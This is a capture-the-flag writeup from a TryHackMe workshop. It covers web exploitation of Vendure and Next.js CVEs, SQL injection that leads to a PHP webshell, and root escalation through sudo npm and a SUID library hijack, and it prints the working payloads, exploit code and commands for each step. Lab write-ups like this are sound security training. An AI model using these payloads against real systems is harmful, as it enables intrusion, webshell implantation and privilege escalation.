# TryHackMe Dehli Meetup CTF — Workshop Writeup

**TryHackMe x EHAX hands-on workshop · B. R. Ambedkar Auditorium, Delhi Technological University · 2026-10-13**

The live room (`tryhackme.com/room/dehlimeetup`) is 11 tasks across Web, Networking, Boot2Root, LLM and Coding, worth 106 points on a 60-minute clock. 208 players. Each task spins up its own AttackBox; Tasks 4, 10 and 11 need the Europe (Ireland) region. This writeup covers the four tasks I solved end to end; the rest are stubbed for a follow-up pass.

---

## Task 1 — Introduction (Intro)

*Writeup pending — fill from own notes.*

---

## Task 2 — Asset Server (Web, 60 pts)

**Target.** Vendure 3.0.4 (headless e-commerce). Express frontend on :80 reverse-proxies `/assets/*` to Vendure on :3001 via `http-proxy-middleware`. Flag at `/flag.txt`, one dir above Vendure's asset root.

**Bug.** `@vendure/asset-server-plugin` **CVE-2024-56357** — path traversal in the asset handler. Request path is joined onto the asset root after URL-decoding, so encoded `../` escapes unchecked.

**Payload.**
```
GET /assets/..%2F..%2Fflag.txt
```
Also works: `%2e%2e%2f`. Does **not** work: literal `../` (collapsed by the Express proxy before Vendure sees it). Hit port 80, not 3001.

**Why.** Decode-then-join inside the plugin. The Express proxy sanitises what it can parse; percent-encoded path segments pass through to a sink that decodes before normalising.

**Takeaway.** Encoding bypasses survive at trust boundaries. The guard in front sanitises its own syntax; the guard behind decodes and trusts.

**Flag format:** `THM{REDACTED}`.

---

## Task 3 — Gatepass (Web)

**Target.** Next.js 14.1.1 app with middleware auth-gating `/api/*`. Route `/api/file?path=…` reads a file and returns contents, past the middleware.

**Bug.** **CVE-2025-29927** — Next.js middleware subrequest bypass. The internal `x-middleware-subrequest` header tells Next.js the request originated from inside its own middleware (to avoid re-running the chain). The vulnerable version honours it from any client, skipping middleware entirely.

**Payload.**
```
GET /api/file?path=/flag.txt
x-middleware-subrequest: middleware
```
Nested variant also lands: `middleware:middleware:middleware:middleware:middleware`. File handler blocks `..` but takes absolute paths, so `/flag.txt` clears the second filter.

**Why.** Middleware recursion marker trusted inbound. Fix in later Next.js scopes the header to internal invocations only.

**Takeaway.** Framework-internal headers are not a security boundary unless the framework strips them inbound. First thing to check when middleware does auth: can it be told it already ran.

**Flag format:** `THM{REDACTED}`.

---

## Task 4 — Bastion Hop (Networking)

*Writeup pending — Europe (Ireland) region required. Add pivot/bastion path and the resource reached.*

---

## Task 5 — Stolen Footprints (Networking)

*Writeup pending — add the pcap/traffic analysis path and the artefact(s) that produced the flag.*

---

## Task 6 — Sequel (Boot2Root, 30 pts)

**Target.** HomeTel. Next.js on :3000, Apache on :80 (phpMyAdmin 4.9.5, dir listings), SSH on :22. Three flags: web / user / root.

### Recon

Next.js dev build leaks source paths (`/home/ubuntu/csportal/src/pages/{login,home}/index.js`) and endpoints `/api/login`, `/api/bill`, `/api/logout`.

### Web flag — SQLi in `/api/bill`

Bill-lookup form POSTs `{"NumReference": "<n>"}`. Numeric, unquoted — no quote escape needed.

```
{"NumReference":"0 UNION SELECT 1,2,3"}
→ 3 cols: Nreference, price, tax

{"NumReference":"0 UNION SELECT version(),2,3"}
→ 8.0.36-0ubuntu0.20.04.1

{"NumReference":"0 UNION SELECT current_user(),database(),3"}
→ root@localhost, bill_app_db

{"NumReference":"0 UNION SELECT GROUP_CONCAT(table_name),2,3
                FROM information_schema.tables
                WHERE table_schema=database()"}
→ bill, flag, users

{"NumReference":"0 UNION SELECT flag,2,3 FROM bill_app_db.flag"}
→ web flag text
```

`/api/login` returns full matching user row but has a hard-coded guest-only branch that rejects multi-row responses — dead end. `/api/bill` is the real sink.

### User flag — MySQL FILE → PHP webshell

`root@localhost` with FILE priv, empty `secure_file_priv`. `LOAD_FILE` is AppArmor-restricted (`/etc/passwd` + `/etc/mysql/my.cnf` work, `/home/*` + `/etc/ssh/sshd_config` + `/proc/mounts` return NULL). But `INTO OUTFILE` to `/var/www/html/` is allowed.

```
{"NumReference":"0 UNION SELECT UNHEX('3c3f70687020...'),2,3
                INTO OUTFILE '/var/www/html/pwn.php'"}
```
Hex payload is `<?php system($_GET["c"]); ?>`. API responds *"User not found"* (zero data rows), but the file lands. `GET /pwn.php?c=id` → `uid=33(www-data)`.

`find / -name user.txt 2>/dev/null` → `/var/www/user.txt`. Also leaked: `/home/ubuntu/csportal/.env` → `MYSQL_PASSWORD=root@123`.

### Root flag — sudo npm, done right for modern npm

`sudo -l` as www-data: `(root) NOPASSWD: /usr/bin/npm *`. npm 8.19.4.

**The classic GTFOBins `preinstall` trick does not work on npm 8+.** npm wrapper drops privs on lifecycle scripts to the dir owner, even with `--unsafe-perm`. Verified: `id` inside `preinstall` returned `uid=33`.

**Working path — `init-module` userconfig abuse.** npm `require()`s `init-module` inside the npm process (still root), before lifecycle isolation runs.

```sh
echo 'init-module=/tmp/init.js' > /tmp/.npmrc

cat > /tmp/init.js <<'EOF'
require("child_process").execSync(
    "cat /root/root.txt > /tmp/rf; chmod 666 /tmp/rf"
);
process.exit(0);
EOF

sudo npm init -y --userconfig=/tmp/.npmrc --prefix=/tmp/foo
cat /tmp/rf
```

**Takeaways.**
- `INTO OUTFILE` lands even when the HTTP response says *"User not found"* — the write happens at execute time, not row-return time.
- GTFOBins' default `npm` entry is misleading on npm 8+. `init-module` via `--userconfig` is the reliable escape.

**Flag formats:** web `THM{REDACTED}`, user `THM{REDACTED}`, root `THM{REDACTED}`.

---

## Task 7 — Malscan (Boot2Root, 60 pts)

**Target.** MalScan Labs sandbox on Apache :80. Two flags: user, root.

### Recon

Only 22 and 80 open. `/` is a placeholder. Content discovery finds `/dev/` (301), a working frontend with `upload.php`, `about.php`, `contact.php`, and a readable `assets/` listing.

### Initial RCE — the sandbox is not a sandbox

`/dev/upload.php` accepts multipart POST, ELF magic-byte check (text → *"Error: File is not a binary."*), runs the ELF as www-data, prints stdout under *"Execution Output:"*. YARA scan ahead of execution doesn't block msfvenom shellcode.

```sh
msfvenom -p linux/x64/exec \
    CMD='id; uname -a; find / -name user.txt 2>/dev/null; ls -la /home' \
    -f elf -o /tmp/mal

curl -X POST http://TARGET/dev/upload.php -F "file=@/tmp/mal"
```

Leaks: `uid=33(www-data)`, host `tryhackme-2404` (Ubuntu 24.04), `/home/{agent,ubuntu}` unreadable, **user flag at `/opt/user.txt`**.

### Root — SUID `/opt/agent/scanner` + libscan.so hijack

`find / -perm -4000` → `/opt/agent/scanner` (SUID root, PIE ELF, not stripped). Dir perms: `/opt/agent/` is `drwxrwxrwx`.

Exfil binary via a base64 CMD payload, `objdump -d`:

```c
char buf[0x200];
readlink("/proc/self/exe", buf, 0x1ff);          // "/opt/agent/scanner"

char path[0x200];
snprintf(path, 0x200, "%s/libscan.so", dirname(buf));
                                                 // "/opt/agent/libscan.so"

void *h = dlopen(path, RTLD_NOW);
void (*fn)(void) = dlsym(h, "run");
fn();
```

**No `libscan.so` ships.** Fresh run prints `dlopen error: ... No such file or directory`. World-writable `/opt/agent/` + SUID bit = plant the library, get root.

### Build the payload library

Constructor is enough (`RTLD_NOW` fires it inside `dlopen`, before `dlsym("run")`):

```c
#include <stdlib.h>
#include <unistd.h>

void run(void) {
    setuid(0); setgid(0);
    system("id > /tmp/root_pwn; "
           "cat /root/root.txt >> /tmp/root_pwn; "
           "chmod 666 /tmp/root_pwn");
}

__attribute__((constructor))
void ctor(void) { run(); }
```

**Compile gotcha.** Apache's child env has an empty PATH. `gcc` wrapper's `execvp("cc1", ...)` fails with `No such file or directory` even though `cc1` is at `/usr/libexec/gcc/x86_64-linux-gnu/13/cc1`. Fix: pass `-B` for both tool dirs **and** export a sane PATH for the linker's own child processes.

```sh
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
gcc -B/usr/libexec/gcc/x86_64-linux-gnu/13/ -B/usr/bin/ \
    -shared -fPIC -o /tmp/libscan.so /tmp/libscan.c
```

Plant and trigger:

```sh
cp /tmp/libscan.so /opt/agent/libscan.so
chmod 755 /opt/agent/libscan.so
/opt/agent/scanner      # SUID loads our .so, constructor runs as root
cat /tmp/root_pwn
# → uid=0(root) ... + root flag text
```

All bundles into a single msfvenom `CMD=` payload for one-shot upload.

**Takeaways.**
- A "sandbox" that advertises *"passed YARA and was emulated"* while actually executing the binary and streaming its stdout back is a free `system()` as the server user.
- A SUID binary that `dlopen`s a sibling path in a 777 directory doesn't need the library to be overwritten — the *missing* library is the hijack.
- Apache's child env has empty PATH, not an AppArmor denial. `-B` + explicit `PATH` fixes it with no special perms.

**Flag formats:** user `THM{REDACTED}`, root `THM{REDACTED}`.

---

## Task 8 — HelloGPT (LLM)

*Writeup pending — prompt-injection / system-prompt leak. Note the system prompt the model was told to protect, the injection that leaked it, and whether role-play framing, context-stuffing or a tool-call escape was the move.*

---

## Task 9 — BankGPT (LLM)

*Writeup pending — add the model's authorised actions, the privilege/role scope that had to be crossed, and the exact chat turns that produced the flag.*

---

## Task 10 — Math Wiz (Coding)

*Writeup pending — Europe (Ireland) region required. Add input shape, algorithm/edge case that mattered, and the final solution script.*

---

## Task 11 — Exposed (Coding)

*Writeup pending — Europe (Ireland) region required. Add the exposed data-source, the parsing that extracted the flag, and the solution script.*

---

## Credits

- Room: `tryhackme.com/room/dehlimeetup`
- Hosts: TryHackMe x EHAX, Delhi Technological University
- Workshop date: 2026-10-13
